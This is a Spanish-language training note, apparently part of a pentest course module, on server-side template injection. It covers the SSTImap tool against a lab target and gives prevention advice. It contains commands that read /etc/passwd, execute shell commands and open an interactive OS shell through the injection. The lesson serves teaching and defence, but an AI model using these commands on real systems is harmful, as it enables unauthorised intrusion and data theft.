# Módulo 07 — Server-side Attacks

## Sección 12/19: SSTI Tools of the Trade & Preventing SSTI

> [!NOTE]
> Existen herramientas que automatizan identificación, confirmación de motor, y explotación de SSTI. Del lado defensivo, el principio central es que el input de usuario nunca debe llegar al parámetro de plantilla.

## 🛠️ SSTImap

> [!WARNING]
> `tplmap` (histórico) ya no se mantiene y corre sobre Python 2. **SSTImap** es su sucesor moderno.

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

Salida esperada:
```
[+] SSTImap identified the following injection point:
  Query parameter: name
  Engine: Twig
  Capabilities:
    Shell command execution: ok
    File write: ok
    File read: ok
```

### Descargar archivo remoto
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```

### Ejecutar comando
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

### Shell interactiva
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

## 🛠️ Prevención

> [!WARNING]
> El input de usuario nunca debe pasarse al motor de templating como parte del parámetro de plantilla (siempre como valor).

Si la app necesita permitir templates de usuario:
- **Hardening del motor**: remover funciones peligrosas — propenso a bypasses
- **Aislar el entorno de ejecución**: correr el motor completamente separado del servidor web, ej. en un contenedor Docker dedicado

## 🧠 Quiz de repaso

<details>
<summary>¿Por qué SSTImap reportando "capabilities" es más útil que solo confirmar "sí, es vulnerable"?</summary>

Porque distintas configuraciones pueden habilitar distintos niveles de explotación — no toda SSTI confirmada permite automáticamente RCE completo. Reportar capacidades concretas ahorra tiempo de prueba y error manual.

</details>

<details>
<summary>¿Por qué remover funciones peligrosas es una mitigación propensa a bypasses?</summary>

Porque depende de una lista necesariamente incompleta de funciones consideradas peligrosas, pero en lenguajes dinámicos suele haber múltiples caminos indirectos para llegar a la misma funcionalidad. Es un enfoque de blacklist, inherentemente más débil que aislar el entorno de ejecución por completo.

</details>

## 🔗 Relacionado
- [10 — Exploiting SSTI - Jinja2](10-exploiting-ssti-jinja2.md)
- [11 — Exploiting SSTI - Twig](11-exploiting-ssti-twig.md)
- [09 — Identifying SSTI](09-identifying-ssti.md)

#cwes #modulo07 #server-side-attacks #ssti #sstimap #prevention #docker
